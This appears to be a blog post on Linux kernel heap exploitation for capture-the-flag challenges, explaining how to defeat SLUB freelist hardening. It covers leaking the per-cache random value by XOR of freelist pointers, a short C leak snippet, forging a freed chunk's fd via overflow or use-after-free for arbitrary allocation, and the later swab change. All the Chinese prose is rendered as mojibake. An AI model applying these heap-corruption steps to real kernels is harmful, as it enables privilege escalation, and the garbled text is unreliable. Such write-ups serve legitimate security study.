<p>å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™é‡Œéœ€è¦æˆ‘ä»¬è·å¾—randomçš„å€¼ï¼Œè¿™ä¸ªå€¼ä¿å­˜åœ¨å¯¹äºsizeçš„kmem_cacheä¸­ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰åœ¨<code>/linux/slub_def.h</code>ä¸­å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.17</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> reserved;		<span class="comment">/* Reserved bytes at the end of slabs */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¹¶ä¸”ä¸åŒsizeçš„kmem_cacheå¯¹åº”çš„randomä¸åŒã€‚</p>
<p>åœ¨æœ‰DEBUGä¿¡æ¯çš„å†…æ ¸ä¸­ï¼Œæˆ‘ä»¬å°è¯•å¯»æ‰¾0x10å¤§å°çš„kmem_cacheæ¯”å¦‚æˆ‘ä»¬å¯»æ‰¾0x10å¤§å°çš„å°±éœ€è¦åœ¨ä¿å­˜æ‰€æœ‰kmem_cacheçš„å…¨å±€å˜é‡ç»“æ„kmalloc_cachesä¸­å¯»æ‰¾ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¥½åƒå¾ˆå¤šæ—¶å€™ä¸æ˜¯æŒ‰ç…§é¡ºåºæ¥æ’å¸ƒçš„ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾kmalloc-16ï¼Œä½†æ˜¯è¿™é‡Œå®ƒçš„ç´¢å¼•ä¸º4ï¼Œè€Œä¸æ˜¯2ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png" alt="image-20220116152127879"></p>
<p>å¦å¤–kmalloc_caches[0]å¹¶ä¸æ˜¯ä¸€ä¸ªkmem_cacheç»“æ„çš„ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¶ä»–ç±»å‹ï¼Œæš‚æ—¶ä¸çŸ¥é“ç”¨æ¥å¹²å•¥ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png" alt="image-20220116152404345"></p>
<p>é‚£ä¹ˆå›åˆ°æ­£é¢˜ï¼Œå…ˆå¯»æ‰¾ä¸‹randomï¼Œè¿™ä¸ªå°±æ˜¯0x10å¤§å°çš„kmem_cacheä¸­ä¿å­˜çš„randomå€¼äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png" alt="image-20220116152450367"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¾—åˆ°randomå€¼å°±å¯ä»¥ç®—å‡ºä¸‹ä¸€ä¸ªchunkåœ¨å“ªé‡Œäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png" alt="image-20220116152702584"></p>
<p>ä½†æ˜¯é€šå¸¸æ„ä¹‰ä¸Šå¦‚æœå¼€å¯äº†è¿™ä¸ªä¿æŠ¤ï¼Œæˆ‘ä»¬æ˜¯å¾—ä¸åˆ°å †åœ°å€çš„ï¼Œæœ€å¤šå¾—åˆ°ä¿æŠ¤ä¹‹åçš„fdçš„å€¼ï¼Œæ²¡åŠæ³•ç®—å‡ºæ¥randomçš„å€¼ï¼Œä½†æ˜¯ç”±äºæ˜¯å¼‚æˆ–äº†å½“å‰å †åœ°å€ptrå’Œå †åœ°å€+size(ptr_addr)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹sizeåšæ–‡ç« ï¼Œè¿™æ ·å¯ä»¥æ‰¾å‡ºä¸€äº›è§„å¾‹ã€‚</p>
<p>å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-15" >slubå †æº¢å‡ºçš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="ğŸ”ºæ³¨ï¼š-1"   >
          <a href="#ğŸ”ºæ³¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š-1" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h5>
      <p>åœ¨è¯¥å†…æ ¸ä¸‹çš„åŒä¸€ä¸ªsizeçš„kmem_cacheçš„randomå€¼ä¸ç®¡å¯åŠ¨å¤šå°‘æ¬¡éƒ½æ˜¯å›ºå®šçš„ï¼Œæ— è®ºæœ‰æ²¡æœ‰å¼€å¯KASLRã€‚ï¼ˆè‡³å°‘æˆ‘åœ¨æœ¬åœ°æµ‹çš„æ—¶å€™æ˜¯å¦‚æ­¤çš„ï¼‰</p>

        <h6 id="æœªå¼€å¯KASLR"   >
          <a href="#æœªå¼€å¯KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#æœªå¼€å¯KASLR" class="headerlink" title="æœªå¼€å¯KASLR"></a>æœªå¼€å¯KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png" alt="image-20220118124309671"></p>

        <h6 id="å¼€å¯KASLR"   >
          <a href="#å¼€å¯KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¼€å¯KASLR" class="headerlink" title="å¼€å¯KASLR"></a>å¼€å¯KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png" alt="image-20220118124331545"></p>
<p>å¯ä»¥çœ‹åˆ°éƒ½æ˜¯ä¸€è‡´çš„ã€‚</p>
<p>ä½†æ˜¯æ”¾åˆ°é¢˜ç›®ä¸­å°±ä¸å¤ªç¡®å®šäº†ï¼Œå°±æ˜¯å°†é¢˜ç›®åœ¨æœ¬åœ°è¿è¡Œæµ‹å‡ºæ¥çš„randomå€¼å’Œé¢˜ç›®åœ¨è¿œç¨‹è¿è¡Œæµ‹å‡ºæ¥çš„randomå€¼æ˜¯ä¸æ˜¯ä¹Ÿæ˜¯ä¸€æ ·çš„å‘¢ï¼Œä¹‹å‰çš„è¥¿æ¹–çš„easy_kernelé¢˜ä¸­è²Œä¼¼æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰å®é™…æµ‹è¯•ï¼Œå› ä¸ºè¿˜æ²¡ç¢°åˆ°..ä¸‹å›æ¢ä¸ªæœºå™¨æµ‹è¯•ä¸‹ã€‚æˆ–è€…è¯´å’Œqemuè¿˜æ˜¯ç¯å¢ƒcpuéƒ½æœ‰å…³ç³»å—ï¼ŒæœŸå¾…å¤§ä½¬å›ç­”ã€‚</p>
<p>è€Œä¸”åœ¨åé¢çš„<strong>æ–°ç‰ˆçš„HARDENED</strong>ä¸­ä¹Ÿæœ‰æåˆ°ï¼ŒåŠ å…¥swabè¿ç®—ä¹‹åï¼Œè²Œä¼¼ä¼šå¯¹randomå€¼å†åšä¸€ä¸ªä½2ä¸ªå­—èŠ‚çš„å¤„ç†ï¼Œè¿™ä¸ªæ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Œè¿˜æ˜¯æœ‰ç‚¹ä¸å¤ªæ‡‚ã€‚</p>

        <h5 id="â‘ 0x8ä¸ºä¾‹"   >
          <a href="#â‘ 0x8ä¸ºä¾‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ 0x8ä¸ºä¾‹" class="headerlink" title="â‘ 0x8ä¸ºä¾‹"></a>â‘ 0x8ä¸ºä¾‹</h5>
      <p>0x10å¯¹é½çš„å †å—å…¶fdå‡ä¸€æ ·ï¼Œå–å…¶fdç›´æ¥å¼‚æˆ–0x8å³å¯å¾—åˆ°kmalloc-8çš„randomå€¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png" alt="image-20220116170303600"></p>
<p>åŸå› å¦‚ä¸‹ï¼Œ0x10å¯¹é½çš„å †å—å¼‚æˆ–å…¶å€¼+0x8å¹¶ä¸ä¼šé€ æˆè¿›ä½ï¼Œæ‰€ä»¥å¼‚æˆ–å¾—åˆ°çš„å€¼éƒ½æ˜¯ä¸€æ ·çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png" alt="image-20220116170714710"></p>

        <h5 id="â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰"   >
          <a href="#â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰" class="headerlink" title="â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰"></a>â‘¡0x10ï¼Œ0x20ï¼Œ0x30ç­‰ç­‰</h5>
      <p>è¿™ç§ç±»å‹çš„å…¶fdå’Œrandomå€¼ä¸€èˆ¬å·®åŠä¸ªå­—èŠ‚ï¼Œå¤§ä¸äº†ç›´æ¥çˆ†ç ´ï¼Œ1/16çš„æ¦‚ç‡</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png" alt="image-20220116175038466"></p>
<p>å¹¶ä¸”è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œåœ¨0x10çš„æƒ…å†µä¸‹ä¹Ÿä¼šæœ‰é‡å¤çš„éƒ¨åˆ†ï¼ŒåŒæ ·çš„ï¼Œè¯¥é‡å¤çš„éƒ¨åˆ†å¼‚æˆ–0x10ä¹Ÿä¼šæ˜¯randomå€¼</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png" alt="image-20220116175228263"></p>
<p>å…·ä½“çš„è¿˜æ˜¯è‡ªå·±æ‘¸ç´¢æˆ–è€…çœ‹ä¸€åªç‹—å¸ˆå‚…çš„ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-16" >slubå †æº¢å‡ºçš„åˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="æ³„éœ²random"   >
          <a href="#æ³„éœ²random" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ³„éœ²random" class="headerlink" title="æ³„éœ²random"></a>æ³„éœ²random</h5>
      <p>ä»¥ä¸‹æ³„éœ²Randomæ ·ä¾‹ä¹Ÿæ˜¯å‚ç…§ä¸€åªç‹—å¸ˆå‚…çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">2</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">Show(<span class="number">0</span>, &amp;FD1, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">1</span>, &amp;FD2, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">2</span>, &amp;FD3, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> random;</span><br><span class="line"><span class="keyword">if</span>(FD1==FD3)</span><br><span class="line">    random = FD1^<span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    random = FD2^<span class="number">0x100</span>;</span><br></pre></td></tr></table></div></figure>


        <h5 id="è·å¾—å †åœ°å€ä»»æ„å†™"   >
          <a href="#è·å¾—å †åœ°å€ä»»æ„å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#è·å¾—å †åœ°å€ä»»æ„å†™" class="headerlink" title="è·å¾—å †åœ°å€ä»»æ„å†™"></a>è·å¾—å †åœ°å€ä»»æ„å†™</h5>
      <p>ä½†æ˜¯è·å¾—å †åœ°å€ä¸å¤ªå¥½æ•´ï¼Œéœ€è¦æ‰¾åˆ°freelistçš„æœ€åä¸€ä¸ªå †å—last_chunkï¼Œç„¶åå…¶fdå¼‚æˆ–randomå³å¯å¾—åˆ°è¯¥å †å—çš„åœ°å€ï¼Œè·å¾—å †å—åœ°å€åï¼Œç›´æ¥é‡Šæ”¾è¯¥å †å—last_chunkï¼Œç„¶åé€šè¿‡ä¹‹å‰ä¸€ä¸ªå †å—pre_chunkæº¢å‡ºæˆ–è€…UAFï¼ŒæŒ‰ç…§å¼‚æˆ–è§„åˆ™ä¿®æ”¹last_chunkçš„fdï¼Œå°±èƒ½å®ç°ä»»æ„ç”³è¯·äº†ã€‚</p>
<p>ä»¥8192å¤§å°ä¸ºä¾‹ï¼Œç”³è¯·åˆ°æœ€åä¸€ä¸ªchunkæ—¶é‡Šæ”¾ï¼Œç„¶åå†ç”³è¯·å°±èƒ½ç”³è¯·å›æ¥äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png" alt="image-20220116181547997"></p>
<p>æ³¨æ„è·å–å †åœ°å€çš„æ—¶å€™ï¼Œç”±äºä¸åŒsizeçš„kmem_cacheçš„æœ€å¤§freelistæ•°é‡å·®å¼‚è¾ƒå¤§ï¼Œsizeè¶Šå¤§çš„å…¶freelisté“¾è¡¨ä¸ªæ•°è¶Šå°‘ï¼Œè¶Šå®¹æ˜“ç”³è¯·åˆ°æœ€åä¸€ä¸ªã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png" alt="image-20220116174436185"></p>

        <h4 id="2-HARDENEDæ–°ç‰ˆæ”¹åŠ¨"   >
          <a href="#2-HARDENEDæ–°ç‰ˆæ”¹åŠ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HARDENEDæ–°ç‰ˆæ”¹åŠ¨" class="headerlink" title="(2)HARDENEDæ–°ç‰ˆæ”¹åŠ¨"></a>(2)HARDENEDæ–°ç‰ˆæ”¹åŠ¨</h4>
      
        <h5 id="kasan-reset-tag"   >
          <a href="#kasan-reset-tag" class="heading-link"><i class="fas fa-link"></i></a><a href="#kasan-reset-tag" class="headerlink" title="kasan_reset_tag"></a>kasan_reset_tag</h5>
      <p>ä»v5.0å¼€å§‹ï¼ŒåŠ äº†ä¸€ä¸ªæ–°çš„ä¸œè¥¿</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr));</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªä¸çŸ¥é“ç”¨æ¥å¹²å•¥çš„ï¼Œæœ‰ç‚¹è’™åœˆ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//linux/kasan.h</span><br><span class="line">static inline void *kasan_reset_tag(const void *addr)</span><br><span class="line">&#123;</span><br><span class="line">	return (void *)addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h5 id="swab"   >
          <a href="#swab" class="heading-link"><i class="fas fa-link"></i></a><a href="#swab" class="headerlink" title="swab"></a>swab</h5>
      <p>ä»v5.6.4å¼€å§‹ï¼ŒåˆåŠ äº†ä¸€ä¸ªè¿ç®—</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swab(kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br></pre></td></tr></table></div></figure>

<p>æœ¬è´¨ä¸Šæ˜¯å¤§å°ç«¯äº’æ¢ï¼Œæ¯”å¦‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> before = <span class="number">0xaabbccdd</span>;</span><br><span class="line"><span class="keyword">int</span> after = swab(before);</span><br><span class="line">after == <span class="number">0xddccbbaa</span>;</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªç›´æ¥è§£ï¼Œå‚ç…§å“ªä¸ªå¸ˆå‚…çš„æ¥ç€ï¼Œå¿˜è®°äº†â€¦..</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __u64 u_int64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swab64(x) ((__u64)((((__u64)(x) &amp; (__u64)0x00000000000000ffULL) &lt;&lt; 56) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000000000ff00ULL) &lt;&lt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000000000ff0000ULL) &lt;&lt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00000000ff000000ULL) &lt;&lt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000ff00000000ULL) &gt;&gt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000ff0000000000ULL) &gt;&gt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00ff000000000000ULL) &gt;&gt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0xff00000000000000ULL) &gt;&gt; 56)))</span></span><br></pre></td></tr></table></div></figure>

<p>ç„¶ååˆä¸çŸ¥é“ä»å“ªä¸ªç‰ˆæœ¬å¼€å§‹ï¼ŒFDçš„å­˜æ”¾ä½ç½®å‘ç”Ÿæ”¹å˜ï¼Œæ”¾åœ¨äº†chunk_addr+(size/2)çš„ä½ç½®ä¸Šï¼Œä»¥0x80å¤§å°çš„chunkä¸ºä¾‹å­(åæ­£v5.0æ²¡æœ‰ï¼Œv5.7æœ‰)</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png" alt="image-20220117105059115"></p>
<p>æ­¤å¤–è®¡ç®—æ–¹å¼ä¹Ÿæœ‰ç‚¹å˜åŒ–ï¼Œptr_addrä¸å†æ˜¯å½“å‰chunkçš„åœ°å€ï¼Œè€Œæ˜¯FDçš„åœ°å€ï¼ŒåŒæ—¶è¿˜æ˜¯ä¼šä¸ä¸Šé¢çš„è¿ç®—åšä¸€ä¸ªç®€å•çš„åˆå¹¶:</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr) ^ next_chunk_addr</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥å½“æˆ‘ä»¬æœ¬åœ°æŠŠrandomå€¼æµ‹å‡ºæ¥ä¹‹åï¼Œå†ä¾æ®freelistçš„æœ€åä¸€ä¸ªç›´æ¥æ”¹next_addrç„¶åå¥—å…¥ä¸Šè¿°å…¬å¼ï¼Œè·å¾—FDå€¼ï¼Œå°†FDå€¼å†™å…¥å³å¯å®Œæˆä¸Šè¿°ä»»æ„å †å—ç”³è¯·ã€‚ï¼ˆä½†æ˜¯è¿œç¨‹è¿˜æ²¡æœ‰è¯•è¿‡ï¼Œæƒ³æ¥ä¾æ®æœ€è¿‘çš„easy_kernelä¸­æµ‹å‡ºæ¥çš„æƒ…å†µåº”è¯¥æ˜¯randomå€¼ä¹Ÿæ˜¯ä¸å˜çš„ï¼‰</p>
<p>åŒæ ·çš„å½“ä½äºfreelistçš„æœ€åä¸€ä¸ªchunkæ—¶ï¼Œnext_chunk_addr = 0ï¼Œä¸Šè¿°å…¬å¼å°±å˜æˆå¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr)</span><br></pre></td></tr></table></div></figure>

<p>è¿›è€Œå¯ä»¥æµ‹å‡ºFD_addrï¼Œå¾—åˆ°chunkçš„åœ°å€ã€‚å½“ç„¶ï¼Œå‰ææ˜¯å»ºç«‹åœ¨è¿œç¨‹çš„randomå€¼ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p>
